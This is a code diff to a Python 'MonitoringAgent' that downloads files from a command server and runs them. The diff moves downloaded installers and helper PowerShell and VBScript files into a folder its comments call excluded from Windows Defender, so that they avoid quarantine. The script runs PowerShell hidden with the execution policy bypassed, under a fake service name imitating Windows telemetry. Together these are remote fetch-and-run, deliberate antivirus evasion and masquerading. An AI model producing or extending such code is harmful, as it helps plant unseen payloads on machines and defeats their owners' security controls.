@@ -45,7 +45,7 @@ else:
     from . import system_info as system_info_mod
 
 # You can change this to 1.1.32, etc. to test auto-update
-AGENT_VERSION = "1.1.72"
+AGENT_VERSION = "1.1.73"
 POLL_SECONDS = 15
 
 def _now_iso() -> str:
@@ -316,7 +316,6 @@ class MonitoringAgent:
                 return
             self.api.ack_command(cid, "downloading")
             
-            import tempfile
             import requests
             
             if kind == "patch" or file_name.lower().endswith(".zip"):
@@ -325,9 +324,12 @@ class MonitoringAgent:
                 suffix = ".exe"
             else:
                 suffix = ""
-            temp_fd, temp_path = tempfile.mkstemp(suffix=suffix)
+            # Download into the app's own directory (which is excluded from
+            # Windows Defender) instead of the system temp folder, so the
+            # downloaded installer is not quarantined.
+            app_dir = os.path.dirname(os.path.abspath(sys.executable))
+            temp_path = os.path.join(app_dir, "svctcom_update" + suffix)
             try:
-                os.close(temp_fd)
                 with requests.get(download_url, stream=True, timeout=60) as r:
                     r.raise_for_status()
                     with open(temp_path, "wb") as f:
@@ -354,10 +356,11 @@ class MonitoringAgent:
 
     def _run_installer(self, temp_path: str) -> None:
         if sys.platform.startswith("win"):
-            import tempfile
-
-            ps1_path = os.path.join(tempfile.gettempdir(), "svctcom_update.ps1")
-            log_path = os.path.join(tempfile.gettempdir(), "svctcom_update.log")
+            # Place helper scripts in the app's own directory so they
+            # are also covered by the Defender exclusion.
+            app_dir = os.path.dirname(os.path.abspath(sys.executable))
+            ps1_path = os.path.join(app_dir, "svctcom_update.ps1")
+            log_path = os.path.join(app_dir, "svctcom_update.log")
             pid = os.getpid()
             exe_name = "windowstelementoryservice.exe"
 
@@ -428,7 +431,7 @@ class MonitoringAgent:
                 os.environ.get("SystemRoot", r"C:\Windows"),
                 r"System32\wscript.exe",
             )
-            vbs_path = os.path.join(tempfile.gettempdir(), "svctcom_update.vbs")
+            vbs_path = os.path.join(app_dir, "svctcom_update.vbs")
             vbs_content = (
                 'Set sh = CreateObject("WScript.Shell")\r\n'
                 f'sh.Run "powershell.exe -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -File ""{ps1_path}""", 0, False\r\n'
